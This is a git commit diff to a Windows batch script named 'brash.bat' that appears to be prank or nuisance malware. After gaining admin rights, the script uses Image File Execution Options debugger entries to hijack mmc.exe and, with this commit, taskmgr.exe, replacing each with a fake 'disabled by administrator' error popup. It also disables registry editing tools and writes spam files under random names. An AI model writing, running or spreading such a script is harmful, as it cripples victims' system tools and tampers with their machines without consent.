01d24f0488c250a7026ce73d1e1f7c57e8ed8d36
michelle1574 <70703680+michelle1574@users.noreply.github.com>
2021-08-23 19:03:45 +0100

    Update brash.bat

--- trash-1/brash.bat
+++ trash-1/brash.bat
@@ -19,10 +19,12 @@ if '%errorlevel%' NEQ '0' (
     exit /B
 
 :gotAdmin
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /v DisableTaskMgr /d 1 /t REG_DWORD /f > nul
 echo x=msgbox("The MMC has been disabled by administrator.", VBOkOnly+VbCritical, "Error") > C:\Windows\error_mmc.vbs
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /d C:\Windows\error_mmc.vbs /t REG_SZ /f > nul
+echo x=msgbox("The task manager been disabled by administrator.", VBOkOnly+VbCritical, "Error") > C:\Windows\error_taskmgr.vbs
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d C:\Windows\error_taskmgr.vbs /t REG_SZ /f > nul
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /d 1 /t REG_DWORD /f > nul
+
 mkdir C:\%random%
 echo spamspamspamspamspamspamspam > %random%\%random%
 echo spamspamspamspamspamspamspam > %random%
